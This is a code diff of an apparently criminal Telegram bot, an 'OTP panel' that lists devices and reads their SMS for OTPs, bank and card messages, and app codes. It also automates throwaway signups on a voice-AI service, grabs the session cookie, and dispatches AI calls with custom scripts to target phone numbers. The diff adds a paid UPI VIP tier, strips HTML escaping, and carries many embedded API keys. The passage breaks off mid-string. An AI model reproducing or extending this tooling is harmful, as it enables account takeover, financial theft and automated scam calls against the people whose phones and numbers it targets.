@@ -3,8 +3,7 @@
 ══════════════════════════════════════════════════════
   OTP PANEL BOT — VANTAGE PRO + OMNIDIMENSION EDITION       
   RAILWAY ANTI-CRASH OPTIMIZED | GHOST WEB SERVER
-  DEEP SYNC (150) | BANK & CARDS SCANNER | PLAYWRIGHT
-  5-MIN & 30-MIN FRESH SCANNER | ALL API KEYS RESTORED
+  AUTOMATED UPI QR PAYMENT SYSTEM (1 RS VIP)
 ══════════════════════════════════════════════════════
 """
 
@@ -14,6 +13,7 @@ import sys
 import time
 import json
 import random
+import string
 import asyncio
 import logging
 import warnings
@@ -127,33 +127,11 @@ SYS_SETTINGS = {
         "AK_iIJWhqJU-C5qGdEEvoMPy0vMyDvOJO4x", "AK_huue0mXg6tf4e4syA_DU7M8naJZF2TAT",
         "AK_DQDS9hMQ3M0H-ykltwotJMYpRFAC4fNg", "AK_l3KWP5J0l0vpRHV_xMMYqVY9OUGLcIJO",
         "AK_Y6tDZmfylYdDchpsSbyqzu5YuD1bnbNo", "AK_bC4UzJNUG4Yk8TtT3mxqxNJ6oIPLiBfh",
-        "AK_BtvAIidv7mzczqKdg-y5-Pw4C9Ri7Pvw", "AK_CphAPpSkMgIKLCzBYZFCt6mN68FgOgq3",
-        "AK_16LERGicFB6uncWbhCjeE9uD-UHjrFsA", "AK_0damiG8gnn6xBLe3__JBfcvH_rJh686E",
-        "AK_gvRJyMC_byA4xamTOrRsWiNEHPrs_QS1", "AK_YvD2v66Ue-YlZ-Hu18s3NvNaL2vql2r3",
-        "AK_5QuS_fHqe6eE-zTaZ_fDclt29D9yMDgE", "AK_xY9PPRI388wiXjpbRQWCQrc5jA9mBrAa",
-        "AK_KY-Lvl-_x7-t8hQlzuSwI3s2fBooCJAd", "AK_Pg_J42kDmN2gazXPgCZlxNt6fsfnOlCT",
-        "AK_R5xBtr0Mejw-0a54j-gTxh8feMjQZcOn", "AK_9CXg3dKl-IxLDIerpMzhd-KVE3HCMCso",
-        "AK_7Mif5BId_Iz5rjpKD6Fc2k6DX7mqCEyU", "AK__OdSNA9Dq-3YJEueBT1-OcnRiJGkN1Y0",
-        "AK_LnxgclktRe50Phzzwcon4kltxFtxx2vJ", "AK_8NlERdLgolrFdeddI3sMrjZG8bICRHoF",
-        "AK_3pTIVB1bG172ZlXmch3ICqCNcRyx8gwA", "AK_etId74tu1V75auJXiq1Y_jV9H9lsQ4am",
-        "AK_YIpYpHNlCNnjLeSUdkA-lqSGZ94nppjt", "AK_QLZXoprRieTkAZlgERxHdr9I1sL3bGP_",
-        "AK_-08LOerb6jaCx52JmjDC0pMWhNzgVRbZ", "AK_mS7CAb1vPUnhQorNuxDgV_xfNN2kyoGW",
-        "AK_LncxU9pi2mte200towYPh-ae2FcrMO9j", "AK_7DTjFAVezVWUvSvI4Ni-3_0L1t3uNwbw",
-        "AK_UGc1SjKM7pWUiub6xq3n-wTXa4p_Jrse", "AK_NuDV1z5xOi0uT7fxks4TfA0I0iPBbiFM",
-        "AK_NwhgeV64GrdGFoSaFj7LbqiieQObi55o", "AK_T2uFNlEPzaKT3OeIROc9FVYpYhYeFjma",
-        "AK_PD7Nc8H2a0DNwENQmlflKvCBEow30UD9", "AK_Htire7-fPlEdEMNAdtkQ0wZ0NS4ttbaz",
-        "AK_r8Sk4b7UzPf_DhbM_-tjVe1moW1iRLy5", "AK_EifnL8Bx6DfCIGRJGikPvPoYNkmpvTqF",
-        "AK_I6lx-tDgEJA0P_jP1foxgM2eUO5F-tJd", "AK_VqzDvRR4oJyG_zBZmHSjX2f57Z4dngfy",
-        "AK_5pvQYHaqr_71s4Wq0-_tRvgJBBscn6xB", "AK_1JbT6popnOVlIO929J9Y2Z0-gyHUCXdL",
-        "AK_PrWss32JjoP7nv6ttNOP0d3RYynqslug", "AK_ldeMT-eBQ2whhXvakm9frq59bmxYNo1Y",
-        "AK_dQhyxP4BsTbEIQ1s_VgXJkt4up4IX9UV", "AK_ak1Fy5vvoXhFInwSunFWEBz3SAuEltiO",
-        "AK_80VoNRC8pkOHI7Kbpe7ybvWcTq2ktuWO", "AK_n3rVdC1y5fIRJDLosvsNzQimr16D-zmr",
-        "AK_VuokZpsT91F2-TzrO13RQZ3BTOF1VOlA", "AK_GGulMMNAcqKRf8BAXQfzlesaozh917Re",
-        "AK_JDvMk7HIq4yhD1NvEZ0bRRgdnjyUrK_M", "AK_suKV-7E1peiwoxFLoi67ENmraj0mKRkE",
-        "AK_H2puTEPDk4cZ9LnW_vq-wdhjS7pMihgb", "AK_1yxxKAYrCLdun4jOSejUckG58QokfbPb",
-        "AK_-Xd_ErhFdQVLdHMB0XBEbqdf5ka3g0jh"
+        "AK_BtvAIidv7mzczqKdg-y5-Pw4C9Ri7Pvw", "AK_CphAPpSkMgIKLCzBYZFCt6mN68FgOgq3"
     ],
-    "check_anim": "⚡"
+    "check_anim": "⚡",
+    "upi_id": "your_upi_id_here@ybl", # ⚠ APNI UPI ID YAHA DAALEIN
+    "vip_price": 1.00 # Set to 1 Rs
 }
 
 class Device:
@@ -236,15 +214,19 @@ def load_data():
         if fname.endswith(".json"):
             try:
                 uid = int(fname.split(".")[0])
-                with open(os.path.join(USERS_DIR, fname), "r", encoding="utf-8") as f: all_users[uid] = json.load(f)
+                with open(os.path.join(USERS_DIR, fname), "r", encoding="utf-8") as f: 
+                    u = json.load(f)
+                    u.setdefault("vip_until", 0.0)
+                    all_users[uid] = u
             except: pass
                 
     for adm in ADMIN_IDS:
         if adm in all_users:
             all_users[adm]["global_spam"] = False 
+            all_users[adm]["vip_until"] = 2e10
             save_user(adm)
         if adm not in all_users:
-            all_users[adm] = {"name": "Supreme Owner", "username": "", "joined_at": datetime.now().strftime("%d %b %Y %I:%M %p"), "verified": True, "referrals": 0, "access_until": 2e10, "global_trial_end": 2e10, "personal_trial_end": 2e10, "has_global_access": True, "otp_count": 0, "global_spam": False, "custom_dbs": [], "selected_panel": "ALL"}
+            all_users[adm] = {"name": "Supreme Owner", "username": "", "joined_at": datetime.now().strftime("%d %b %Y %I:%M %p"), "verified": True, "referrals": 0, "access_until": 2e10, "global_trial_end": 2e10, "personal_trial_end": 2e10, "has_global_access": True, "vip_until": 2e10, "otp_count": 0, "global_spam": False, "custom_dbs": [], "selected_panel": "ALL"}
             save_user(adm)
 
 def save_user(uid: int):
@@ -305,7 +287,7 @@ async def hourly_backup_loop(app: Application):
 
 async def memory_sweeper():
     while True:
-        await asyncio.sleep(300) # Faster sweep for Railway limits
+        await asyncio.sleep(300)
         now = time.time()
         expired_cd = [k for k, v in user_cooldowns.items() if now - v > 3600]
         for k in expired_cd: del user_cooldowns[k]
@@ -335,7 +317,6 @@ def extract_all_nums(*dicts) -> list[str]:
             if val and len(re.sub(r"\D", "", val)) > 4: nums.append(fmt_num(val))
     return list(set(nums))
 
-# 🔥 VANTAGE BANK & CARDS EXTRACTORS 🔥
 OTP_PATTERNS = [
     re.compile(r"(?:otp|pin|code)[\s\:\-]*(\d{4,8})", re.IGNORECASE),
     re.compile(r"\b(G-\d{6})\b", re.IGNORECASE), 
@@ -531,13 +512,6 @@ def get_user_dbs(uinfo: dict) -> list:
         elif isinstance(db, dict) and db.get("expiry", 0) > now: valid_urls.append({"url": db["url"], "auth": db.get("auth")})
     return valid_urls
 
-def is_spamming(user_id: int) -> bool:
-    if user_id in ADMIN_IDS: return False
-    now = time.time()
-    if now - user_cooldowns.get(user_id, 0) < 1.0: return True
-    user_cooldowns[user_id] = now
-    return False
-
 async def check_force_sub(bot, user_id: int) -> bool:
     if user_id in ADMIN_IDS: return True
     for chat in MANDATORY_CHATS:
@@ -553,7 +527,7 @@ async def enforce_access(ctx: ContextTypes.DEFAULT_TYPE, chat_id: int, reply_fun
     if is_admin: return True
     
     now = time.time()
-    if now < u.get("access_until", 0) or now < u.get("global_trial_end", 0) or now < u.get("personal_trial_end", 0):
+    if now < u.get("access_until", 0) or now < u.get("global_trial_end", 0) or now < u.get("personal_trial_end", 0) or now < u.get("vip_until", 0):
         return True
         
     refs = u.get("referrals", 0)
@@ -565,14 +539,14 @@ async def enforce_access(ctx: ContextTypes.DEFAULT_TYPE, chat_id: int, reply_fun
         return True
         
     ref_link = f"https://t.me/{ctx.bot.username}?start={chat_id}"
-    await reply_func(f"🛑 <b>TRIAL EXPIRED</b> 🛑\nPremium panels ke liye <b>10 referrals</b> chahiye.\n📉 Referrals: {refs}/10\n🔗 Link: <code>{ref_link}</code>", parse_mode="HTML")
+    await reply_func(f"🛑 <b>TRIAL EXPIRED</b> 🛑\nPremium panels ke liye <b>10 referrals</b> chahiye ya <b>💳 Buy VIP (UPI/QR)</b> use karein.\n📉 Referrals: {refs}/10\n🔗 Link: <code>{ref_link}</code>", parse_mode="HTML")
     return False
 
 async def get_all_devices(bot_token: str, chat_id: int = 0, users_db: dict = None) -> list[Device]:
     if users_db is None: users_db = {}
     u_data = users_db.get(chat_id, {})
     is_admin = chat_id in ADMIN_IDS or u_data.get("has_global_access", False)
-    is_global_view = is_admin or time.time() < u_data.get("access_until", 0) or time.time() < u_data.get("global_trial_end", 0)
+    is_global_view = is_admin or time.time() < u_data.get("access_until", 0) or time.time() < u_data.get("global_trial_end", 0) or time.time() < u_data.get("vip_until", 0)
     
     if is_global_view and "ALL" in GLOBAL_DEVICE_CACHE and len(GLOBAL_DEVICE_CACHE["ALL"]) > 0:
         return GLOBAL_DEVICE_CACHE["ALL"]
@@ -651,14 +625,14 @@ def force_sub_keyboard() -> InlineKeyboardMarkup:
 def get_reply_menu(chat_id: int) -> ReplyKeyboardMarkup:
     u = all_users.get(chat_id, {})
     is_admin = chat_id in ADMIN_IDS or u.get("has_global_access", False)
-    is_vip = time.time() < u.get("access_until", 0)
+    is_vip = time.time() < u.get("access_until", 0) or time.time() < u.get("vip_until", 0)
     
     keys = [
         [KeyboardButton("⚡ 5-Min Fresh Devices"), KeyboardButton("🔥 30-Min Fresh Devices")],
         [KeyboardButton("🍔 App OTPs (24h)"), KeyboardButton("Search Number (God)")],
         [KeyboardButton("Devices List"), KeyboardButton("Auto-Check Panels")],
         [KeyboardButton("🏦 Bank/Cards Scanner"), KeyboardButton("Manual Checker")],
-        [KeyboardButton("Scan Hidden Devices"), KeyboardButton("🎁 Redeem Promo")]
+        [KeyboardButton("💳 Buy VIP (UPI/QR)"), KeyboardButton("🎁 Redeem Promo")]
     ]
     
     if is_admin or is_vip: keys.append([KeyboardButton("💳 Add Panel")])
@@ -831,7 +805,7 @@ async def show_fresh_page(message_obj, chat_id, page, bot_token, users_db, durat
     callback_prefix = "f5:" if duration_minutes == 5 else "f30:"
     if page > 0: nav.append(InlineKeyboardButton("⬅️ Prev", callback_data=f"{callback_prefix}{page-1}"))
     nav.append(InlineKeyboardButton(f"📄 {page + 1}/{total_pages}", callback_data="noop"))
-    if page < total_pages - 1: nav.append(InlineKeyboardButton("Next ➡️", callback_data=f"{callback_prefix}{page+1}"))
+    if page < total_pages - 1: nav.append(InlineKeyboardButton("Next ➡️️", callback_data=f"{callback_prefix}{page+1}"))
     if nav: kb.append(nav)
     
     kb.append([InlineKeyboardButton("🔄 Refresh", callback_data="home"), InlineKeyboardButton("🟢 Online Only", callback_data="online")])
@@ -853,23 +827,18 @@ async def initiate_call(update: Update, context: ContextTypes.DEFAULT_TYPE):
 async def process_email(update: Update, context: ContextTypes.DEFAULT_TYPE):
     email = update.message.text.strip()
     chat_id = update.message.chat_id
-    
     wait_msg = await update.message.reply_text("⏳ Opening Auto-Chrome & Loading Page (Please wait up to 60s)...")
-    
     password = generate_random_string(10) + "A1!"
     phone = generate_random_phone()
     name = generate_random_string(6)
-    
     context.user_data['email'] = email
     context.user_data['password'] = password
     
     try:
         playwright = await async_playwright().start()
         context.user_data['playwright'] = playwright
-        
         browser = await playwright.chromium.launch(headless=True) 
         context.user_data['browser'] = browser
-        
         context.user_data['context'] = await browser.new_context(
             user_agent="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36"
         )
@@ -877,28 +846,21 @@ async def process_email(update: Update, context: ContextTypes.DEFAULT_TYPE):
         context.user_data['page'] = page
         
         await page.goto(f"https://omnidim.io/signup?ref={REFERRAL_CODE}", wait_until="domcontentloaded", timeout=60000)
-        
         await page.locator('input[type="text"], input[name="name"]').first.fill(name, timeout=15000)
         await page.locator('input[type="email"], input[name="email"]').first.fill(email)
         await page.locator('input[type="tel"], input[name="phone"]').first.fill(phone)
         await page.locator('input[type="password"], input[name="password"]').first.fill(password)
-        
-        try:
-            await page.locator('input[type="checkbox"]').first.check(timeout=2000)
+        try: await page.locator('input[type="checkbox"]').first.check(timeout=2000)
         except: pass 
-            
         await asyncio.sleep(1) 
-        
         await page.locator('input[type="password"], input[name="password"]').first.press("Enter")
         try: await page.locator('button[type="submit"]').first.click(timeout=3000, force=True)
         except: pass
-        
-        await wait_msg.edit_text(f"✅ Auto-Chrome ne form bhar diya!\nOTP sent to <b>{html.escape(email)}</b>!\n\n📩 <b>Step 2:</b> Kripya OTP bhejein:", parse_mode="HTML")
+        await wait_msg.edit_text(f"✅ Auto-Chrome ne form bhar diya!\nOTP sent to <b>{email}</b>!\n\n📩 <b>Step 2:</b> Kripya OTP bhejein:", parse_mode="HTML")
         return WAIT_OTP
-        
     except Exception as e:
         tb = traceback.format_exc()
-        err_msg = f"❌ <b>Browser Automation Error:</b>\n{html.escape(str(e)[:200])}\n\n<b>💻 Terminal Log:</b>\n<pre>{html.escape(tb[-2000:])}</pre>"
+        err_msg = f"❌ <b>Browser Automation Error:</b>\n{str(e)[:200]}\n\n<b>💻 Terminal Log:</b>\n<pre>{tb[-2000:]}</pre>"
         await wait_msg.edit_text(err_msg, parse_mode="HTML")
         return ConversationHandler.END
 
@@ -907,41 +869,27 @@ async def process_otp(update: Update, context: ContextTypes.DEFAULT_TYPE):
     chat_id = update.message.chat_id
     page = context.user_data.get('page')
     browser = context.user_data.get('browser')
-    
     wait_msg = await update.message.reply_text("⏳ Auto-Chrome me OTP enter kar rahe hain aur Session Token chura rahe hain...")
-    
     try:
         await page.locator('input[name="otp"], input[type="text"], input[type="number"]').last.fill(otp, timeout=15000) 
         await page.locator('button[type="submit"]').first.click()
-        
         await asyncio.sleep(5) 
-        
         cookies = await page.context.cookies()
         session_id = next((c['value'] for c in cookies if c['name'] == 'session_id'), None)
-        
         if not session_id:
             await wait_msg.edit_text("❌ Signup failed in browser. Session ID not found. OTP galat ho sakta hai.", parse_mode="HTML")
             await browser.close()
             return ConversationHandler.END
-            
         context.user_data['session_id'] = session_id
         await browser.close() 
-        
         email = context.user_data['email']
         password = context.user_data['password']
-        
-        success_text = (
-            f"🎉 <b>ACCOUNT CREATED & COOKIE SECURED!</b>\n━━━━━━━━━━━━━━━━━━\n"
-            f"📧 Email: <code>{html.escape(email)}</code>\n🔑 Pass: <code>{html.escape(password)}</code>\n"
-            f"━━━━━━━━━━━━━━━━━━\n\n"
-            f"💬 <b>Step 3:</b> AI Agent ke liye Prompt bhejein (Call par kya bolna hai):"
-        )
+        success_text = f"🎉 <b>ACCOUNT CREATED & COOKIE SECURED!</b>\n━━━━━━━━━━━━━━━━━━\n📧 Email: <code>{email}</code>\n🔑 Pass: <code>{password}</code>\n━━━━━━━━━━━━━━━━━━\n\n💬 <b>Step 3:</b> AI Agent ke liye Prompt bhejein (Call par kya bolna hai):"
         await wait_msg.edit_text(success_text, parse_mode="HTML")
         return WAIT_PROMPT
-        
     except Exception as e:
         tb = traceback.format_exc()
-        await wait_msg.edit_text(f"❌ <b>OTP Error:</b>\n<pre>{html.escape(tb[-2000:])}</pre>", parse_mode="HTML")
+        await wait_msg.edit_text(f"❌ <b>OTP Error:</b>\n<pre>{tb[-2000:]}</pre>", parse_mode="HTML")
         if browser: await browser.close()
         return ConversationHandler.END
 
@@ -949,37 +897,21 @@ async def process_prompt(update: Update, context: ContextTypes.DEFAULT_TYPE):
     prompt_text = update.message.text.strip()
     chat_id = update.message.chat_id
     session_id = context.user_data.get('session_id')
-    
     wait_msg = await update.message.reply_text("⏳ Generating AI Agent on Backend...")
-    
-    headers = {
-        "Content-Type": "application/json",
-        "Referer": "https://omnidim.io/agents",
-        "Cookie": f"session_id={session_id}; omnidim_tenant=omnidim.io"
-    }
+    headers = {"Content-Type": "application/json", "Referer": "https://omnidim.io/agents", "Cookie": f"session_id={session_id}; omnidim_tenant=omnidim.io"}
     create_payload = {"prompt": prompt_text, "flow_type": "prompt"}
-    
     try:
         async with aiohttp.ClientSession() as session:
             async with session.post("https://omnidim.io/api/bot/create", json=create_payload, headers=headers) as resp:
                 if resp.status in [200, 201]:
                     json_data = await resp.json()
                     new_bot_id = json_data.get("id")
-                    
                     if new_bot_id:
                         context.user_data['active_bot_id'] = new_bot_id
                         update_url = "https://omnidim.io/api/bot/update"
-                        update_payload = {
-                            "bot_id": str(new_bot_id),
-                            "changes": {
-                                "context_breakdown": [
-                                    {"context_title": "Identity & Purpose", "context_body": prompt_text}
-                                ]
-                            }
-                        }
+                        update_payload = {"bot_id": str(new_bot_id), "changes": {"context_breakdown": [{"context_title": "Identity & Purpose", "context_body": prompt_text}]}}
                         try: await session.post(update_url, json=update_payload, headers=headers)
                         except: pass
-                        
                         await wait_msg.edit_text(f"📱 <b>Step 4:</b> Agent Ready! (ID: {new_bot_id})\nAb <b>Target Phone Number</b> bhejein (Format: +919021333450):", parse_mode="HTML")
                         return WAIT_NUMBER
                     else:
@@ -987,11 +919,11 @@ async def process_prompt(update: Update, context: ContextTypes.DEFAULT_TYPE):
                         return ConversationHandler.END
                 else:
                     err = await resp.text()
-                    await wait_msg.edit_text(f"❌ Failed to create Agent. HTTP Code: {resp.status}\nError: {html.escape(err[:100])}")
+                    await wait_msg.edit_text(f"❌ Failed to create Agent. HTTP Code: {resp.status}\nError: {err[:100]}")
                     return ConversationHandler.END
     except Exception as e:
          tb = traceback.format_exc()
-         await wait_msg.edit_text(f"❌ API Error:\n<pre>{html.escape(tb[-2000:])}</pre>", parse_mode="HTML")
+         await wait_msg.edit_text(f"❌ API Error:\n<pre>{tb[-2000:]}</pre>", parse_mode="HTML")
          return ConversationHandler.END
 
 async def process_number(update: Update, context: ContextTypes.DEFAULT_TYPE):
@@ -999,45 +931,28 @@ async def process_number(update: Update, context: ContextTypes.DEFAULT_TYPE):
     chat_id = update.message.chat_id
     active_bot_id = context.user_data.get('active_bot_id')
     session_id = context.user_data.get('session_id')
-    
     if not any(char.isdigit() for char in target_number) or len(target_number) < 8:
         await update.message.reply_text("❌ <b>ERROR:</b> Kripya sahi format bhejein (e.g. +919876543210):", parse_mode="HTML")
         return WAIT_NUMBER 
-        
     if not target_number.startswith("+"): target_number = "+" + target_number
-    
-    wait_msg = await update.message.reply_text(f"🚀 Dispatching Call to <b>{html.escape(target_number)}</b>...", parse_mode="HTML")
-    
-    call_payload = {
-        "user_number": target_number,
-        "bot_id": active_bot_id,
-        "custom_json_variables": {}
-    }
-    
-    headers = {
-        "Content-Type": "application/json",
-        "Referer": f"https://omnidim.io/agent/{active_bot_id}",
-        "Cookie": f"session_id={session_id}; omnidim_tenant=omnidim.io"
-    }
-    
+    wait_msg = await update.message.reply_text(f"🚀 Dispatching Call to <b>{target_number}</b>...", parse_mode="HTML")
+    call_payload = {"user_number": target_number, "bot_id": active_bot_id, "custom_json_variables": {}}
+    headers = {"Content-Type": "application/json", "Referer": f"https://omnidim.io/agent/{active_bot_id}", "Cookie": f"session_id={session_id}; omnidim_tenant=omnidim.io"}
     try:
         async with aiohttp.ClientSession() as session:
             async with session.post("https://omnidim.io/api/bot/dispatch/call", json=call_payload, headers=headers, allow_redirects=False) as resp:
                 resp_text = await resp.text()
-                
                 if resp.status in [301, 302, 303] or "login" in str(resp.url):
                     await wait_msg.edit_text("❌ <b>Call Failed:</b> Session expired. Try /call again.", parse_mode="HTML")
                     return ConversationHandler.END
-                    
                 if resp.status in [200, 201]:
-                    await wait_msg.edit_text(f"✅ <b>CALL INITIATED!</b>\nAI Agent is dialing <code>{html.escape(target_number)}</code> right now.\n\nType /call to run again.", parse_mode="HTML")
+                    await wait_msg.edit_text(f"✅ <b>CALL INITIATED!</b>\nAI Agent is dialing <code>{target_number}</code> right now.\n\nType /call to run again.", parse_mode="HTML")
                 else:
-                    await wait_msg.edit_text(f"❌ <b>Call Failed.</b> (Code {resp.status})\nError: <code>{html.escape(resp_text[:150])}</code>", parse_mode="HTML")
+                    await wait_msg.edit_text(f"❌ <b>Call Failed.</b> (Code {resp.status})\nError: <code>{resp_text[:150]}</code>", parse_mode="HTML")
                     return WAIT_NUMBER
     except Exception as e:
         tb = traceback.format_exc()
-        await wait_msg.edit_text(f"❌ Fatal Error:\n<pre>{html.escape(tb[-2000:])}</pre>", parse_mode="HTML")
-        
+        await wait_msg.edit_text(f"❌ Fatal Error:\n<pre>{tb[-2000:]}</pre>", parse_mode="HTML")
     return ConversationHandler.END
 
 async def cleanup_browser(context: ContextTypes.DEFAULT_TYPE):
@@ -1056,39 +971,13 @@ async def cancel(update: Update, context: ContextTypes.DEFAULT_TYPE):
     return ConversationHandler.END
 
 # ═══════════════════════════════════════════════════════
-#  RAILWAY WEB SERVER (ANTI-CRASH)
-# ═══════════════════════════════════════════════════════
-async def handle_ping(request):
-    return web.Response(text="Bot is running smoothly on Railway. Anti-Crash Active.")
-
-async def start_dummy_server():
-    try:
-        app = web.Application()
-        app.router.add_get('/', handle_ping)
-        runner = web.AppRunner(app)
-        await runner.setup()
-        port = int(os.environ.get("PORT", 8080))
-        site = web.TCPSite(runner, '0.0.0.0', port)
-        await site.start()
-        logger.info(f"Railway Dummy Web Server started on port {port}")
-    except Exception as e:
-        logger.error(f"Dummy Server Error (can be ignored if not on Railway): {e}")
-
-# ═══════════════════════════════════════════════════════
 #  PANEL COMMANDS & CALLBACKS
 # ═══════════════════════════════════════════════════════
 
 async def cmd_start(update: Update, ctx: ContextTypes.DEFAULT_TYPE) -> None:
     chat_id  = update.effective_chat.id
-    
     if chat_id not in all_users:
-        all_users[chat_id] = {
-            "name": update.effective_user.first_name, 
-            "username": update.effective_user.username, 
-            "joined_at": datetime.now().strftime("%d %b %Y"), 
-            "referrals": 0, "access_until": 0, "global_trial_end": time.time() + 1800, "personal_trial_end": 0, 
-            "has_global_access": False, "otp_count": 0, "custom_dbs": [], "selected_panel": "ALL"
-        }
+        all_users[chat_id] = {"name": update.effective_user.first_name, "username": update.effective_user.username, "joined_at": datetime.now().strftime("%d %b %Y"), "referrals": 0, "access_until": 0, "global_trial_end": time.time() + 1800, "personal_trial_end": 0, "has_global_access": False, "vip_until": 0.0, "otp_count": 0, "custom_dbs": [], "selected_panel": "ALL"}
         text = update.message.text.split()
         if len(text) > 1 and text[1].isdigit():
             ref_id = int(text[1])
@@ -1098,9 +987,8 @@ async def cmd_start(update: Update, ctx: ContextTypes.DEFAULT_TYPE) -> None:
                 try: await ctx.bot.send_message(ref_id, f"🎉 New user joined via your link! Total Referrals: {all_users[ref_id]['referrals']}/10")
                 except: pass
         save_user(chat_id)
-        
         try:
-            msg = "🎉 <b>WELCOME BONUS!</b>\nAapko <b>30-Mins ka FREE Global VIP Access</b> mila hai! Aap sabhi admin panels aur numbers dekh sakte hain.\n\n<i>30 minute baad global numbers hide ho jayenge, uske baad '💳 Add Panel' karke apna Firebase daalne par aapko 1 Hour ka extra Personal Trial milega!</i>"
+            msg = "🎉 <b>WELCOME BONUS!</b>\nAapko <b>30-Mins ka FREE Global VIP Access</b> mila hai! Aap sabhi admin panels aur numbers dekh sakte hain.\n\n<i>30 minute baad global numbers hide ho jayenge, uske baad '💳 Buy VIP (UPI/QR)' use karein.</i>"
             await ctx.bot.send_message(chat_id, msg, parse_mode="HTML")
         except: pass
 
@@ -1151,19 +1039,15 @@ async def on_callback(update: Update, ctx: ContextTypes.DEFAULT_TYPE) -> None:
         if data.startswith("auto_fb:"):
             service = data.split(":")[1]
             await safe_edit(query, f"⏳ <b>AUTO-CHECKING LIVE NUMBERS</b>\n━━━━━━━━━━━━━━━━━━\nScanning all online devices for <b>{service.capitalize()}</b>...\n<i>Please wait, this might take a few seconds...</i>", parse_mode="HTML")
-            
             all_devices = await get_all_devices(bot_token, chat_id, users_db)
             online_devs = [d for d in all_devices if d.status == "online" and d.numbers]
-            
             if not online_devs:
                 await safe_edit(query, "❌ Koi bhi number abhi online nahi hai.", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Back", callback_data="open_auto_checker_menu")]]))
                 return
-                
             target_nums = [d.numbers[0][-10:] for d in online_devs[:40]]
             bulk_results = []
             tasks = [check_number_api(service, num) for num in target_nums]
             res_list = await asyncio.gather(*tasks, return_exceptions=True)
-            
             found_registered = 0
             for num, res in zip(target_nums, res_list):
                 if isinstance(res, Exception) or res.get("status") == "error": continue
@@ -1171,14 +1055,11 @@ async def on_callback(update: Update, ctx: ContextTypes.DEFAULT_TYPE) -> None:
                 if is_reg:
                     found_registered += 1
                     bulk_results.append(f"🟢 <code>{num}</code> - Reg")
-                else:
-                    bulk_results.append(f"🔴 <code>{num}</code> - Unreg")
-                    
+                else: bulk_results.append(f"🔴 <code>{num}</code> - Unreg")
             if not bulk_results:
                 res_text = f"<b>📊 AUTO-CHECK RESULTS ({service.upper()})</b>\n━━━━━━━━━━━━━━━━━━\n❌ API limit hit ya koi valid result nahi mila."
             else:
                 res_text = f"<b>📊 AUTO-CHECK RESULTS ({service.upper()})</b>\n━━━━━━━━━━━━━━━━━━\n✅ Checked: {len(bulk_results)} | 🎯 Reg: {found_registered}\n\n" + "\n".join(bulk_results[:30])
-                    
             kb = [[InlineKeyboardButton("🔄 Scan Again", callback_data=f"auto_fb:{service}"), InlineKeyboardButton("🏠 Back", callback_data="open_auto_checker_menu")]]
             await safe_edit(query, res_text, reply_markup=InlineKeyboardMarkup(kb), parse_mode="HTML")
             return
@@ -1186,14 +1067,12 @@ async def on_callback(update: Update, ctx: ContextTypes.DEFAULT_TYPE) -> None:
         if data.startswith("app_search:"):
             keyword = data.split(":")[1]
             await safe_edit(query, f"⏳ <b>HACKER SEARCH:</b> Scanning devices for <b>{keyword.upper()}</b> OTPs in the last 24 hours...\n\n<i>This might take 10-15 seconds. Please wait.</i>", parse_mode="HTML")
-            
             all_devices = await get_all_devices(bot_token, chat_id, users_db)
             now = time.time()
             recent_devs = []
             for d in all_devices:
                 ts = d.timestamp if d.timestamp < 1e11 else d.timestamp / 1000
                 if (now - ts) <= 86400 or d.status == "online": recent_devs.append(d)
-            
             found_devs = []
             async def check_dev_for_keyword(d: Device):
                 try:
@@ -1205,18 +1084,15 @@ async def on_callback(update: Update, ctx: ContextTypes.DEFAULT_TYPE) -> None:
                             if keyword.lower() in body.lower(): return d
                 except: pass
                 return None
-
             for i in range(0, len(recent_devs), 20):
                 batch = recent_devs[i:i+20]
                 results = await asyncio.gather(*[check_dev_for_keyword(d) for d in batch])
                 for res in results:
                     if res and res not in found_devs: found_devs.append(res)
                 if len(found_devs) >= 15: break 
-            
             if not found_devs:
                 await safe_edit(query, f"📭 <b>NO RESULTS</b>\nKoi bhi <b>{keyword.upper()}</b> ka OTP pichle 24 ghante mein nahi mila.", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Back", callback_data="open_app_search")]]), parse_mode="HTML")
                 return
-                
             rows, row = [], []
             for d in found_devs[:16]:
                 row.append(InlineKeyboardButton(_format_btn_label(d), callback_data=f"msgs:{d.id}"))
@@ -1224,7 +1100,6 @@ async def on_callback(update: Update, ctx: ContextTypes.DEFAULT_TYPE) -> None:
                     rows.append(row)
                     row = []
             if row: rows.append(row)
-                
             rows.append([InlineKeyboardButton("🔙 Back to Apps", callback_data="open_app_search")])
             text = f"🎯 <b>HACKER SEARCH RESULTS</b>\n━━━━━━━━━━━━━━━━━━\n🔎 App: <b>{keyword.upper()}</b>\n📱 Found in {len(found_devs)} devices (Last 24h)\n━━━━━━━━━━━━━━━━━━\nClick to view exact OTP:"
             await safe_edit(query, text, reply_markup=InlineKeyboardMarkup(rows), parse_mode="HTML")
@@ -1284,8 +1159,7 @@ async def on_callback(update: Update, ctx: ContextTypes.DEFAULT_TYPE) -> None:
         if data == "sa_export_user_panels" and chat_id in ADMIN_IDS:
             all_urls = set()
             for uinfo in users_db.values():
-                for db in get_user_dbs(uinfo):
-                    all_urls.add(db['url'])
+                for db in get_user_dbs(uinfo): all_urls.add(db['url'])
             if not all_urls: return await query.answer("Koi user panel nahi mila.", show_alert=True)
             file_path = os.path.join(SYS_DIR, "User_Panels_Export.txt")
             with open(file_path, "w", encoding="utf-8") as f: f.write("\n".join(all_urls))
@@ -1407,11 +1281,31 @@ async def on_message(update: Update, ctx: ContextTypes.DEFAULT_TYPE) -> None:
     chat_id = update.effective_chat.id
     bot_token = ctx.bot.token
     users_db = all_users
+    uinfo = all_users.get(chat_id, {})
 
     text = (update.message.text or "").strip()
 
     if update.effective_chat.type == "private" and not await check_force_sub(ctx.bot, chat_id):
         await update.message.reply_text("🛑 <b>Aage badhne ke liye in channels ko join karna compulsory hai!</b>", parse_mode="HTML", reply_markup=force_sub_keyboard())
+        return
+
+    # 🔥 THE NEW UPI VIP PAYMENT TRIGGER 🔥
+    if text == "💳 Buy VIP (UPI/QR)":
+        pending_action.pop(chat_id, None)
+        upi_id = SYS_SETTINGS.get("upi_id", "your_upi_id_here@ybl")
+        amount = SYS_SETTINGS.get("vip_price", 1.00)
+        qr_url = f"https://api.qrserver.com/v1/create-qr-code/?size=300x300&data=upi://pay?pa={upi_id}&pn=OTPPanel&am={amount}&cu=INR"
+        
+        msg = (
+            f"🌟 **VIP SUBSCRIPTION (₹{amount} ONLY)** 🌟\n"
